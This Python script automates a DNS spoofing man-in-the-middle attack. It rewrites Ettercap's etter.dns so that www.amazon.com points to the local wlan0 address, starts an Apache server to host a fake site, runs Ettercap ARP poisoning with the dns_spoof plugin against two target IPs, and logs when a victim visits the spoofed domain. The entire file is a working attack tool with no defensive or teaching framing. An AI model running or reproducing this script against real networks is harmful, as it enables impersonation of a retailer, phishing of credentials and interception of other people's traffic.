import json
import subprocess
import re
import datetime
import argparse

def load_config():
    with open('config_dns.json') as config_file:
        config = json.load(config_file)
    return config

def get_wlan0_ip():
    # Retrieve IP address for wlan0 using `ip` command
    result = subprocess.run(["ip", "addr", "show", "wlan0"], capture_output=True, text=True)
    match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result.stdout)
    if match:
        return match.group(1)
    else:
        raise RuntimeError("Could not retrieve IP address for wlan0")

def update_ettercap_dns(ip_address):
    dns_file = "etter.dns"  # Local etter.dns file
    target_domain = "www.amazon.com"
    
    # Read and update the DNS file with the new IP
    with open(dns_file, "r") as file:
        lines = file.readlines()
    
    with open(dns_file, "w") as file:
        for line in lines:
            if target_domain in line:
                # Replace the line with the updated IP
                file.write(f"{target_domain} A {ip_address}\n")
            else:
                file.write(line)

def start_apache():
    # Command to start the Apache server
    print("Starting Apache server...")
    subprocess.run(["sudo", "service", "apache2", "start"], check=True)
    print("Apache server started successfully.")

def run_ettercap(config, spoofed_ip, target1, target2):
    interface = config['interface']
    target_domain = "www.amazon.com"
    
    # Command to run Ettercap with packet sniffing
    command = [
        "sudo", "ettercap", "-T", "-i", interface, "-M", "arp:remote",
        "-P", "dns_spoof", f"/{target1}//", f"/{target2}//"
    ]

    # Run Ettercap and capture output
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Monitor output for access to the target domain
    ettercap_output = []
    for line in process.stdout:
        print(line.strip())  # Print to console for real-time feedback
        ettercap_output.append(line.strip())
        if target_domain in line:
            # Terminate Ettercap process immediately upon detection
            process.terminate()
            process.wait()  # Ensure process has fully terminated

            # Create a new log file with a timestamp
            log_file = f"ettercap_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
            with open(log_file, "w") as log:
                log.write(f"Access detected to {target_domain}: Spoofing successful.\n")
                log.write(f"Spoofed to IP: {spoofed_ip}\n")
                log.write("\nEttercap Output:\n")
                log.write("\n".join(ettercap_output))
            print(f"Spoofing successful. Log file created: {log_file}")
            break  # Stop after logging

def main():
    parser = argparse.ArgumentParser(description="Run DNS spoofing with Ettercap")
    parser.add_argument("target1", help="IP address of the first target")
    parser.add_argument("target2", help="IP address of the second target")
    args = parser.parse_args()

    config = load_config()
    wlan0_ip = get_wlan0_ip()
    update_ettercap_dns(wlan0_ip)  # Update etter.dns with wlan0 IP address
    start_apache()  # Start the Apache server
    run_ettercap(config, wlan0_ip, args.target1, args.target2)

if __name__ == "__main__":
    main()
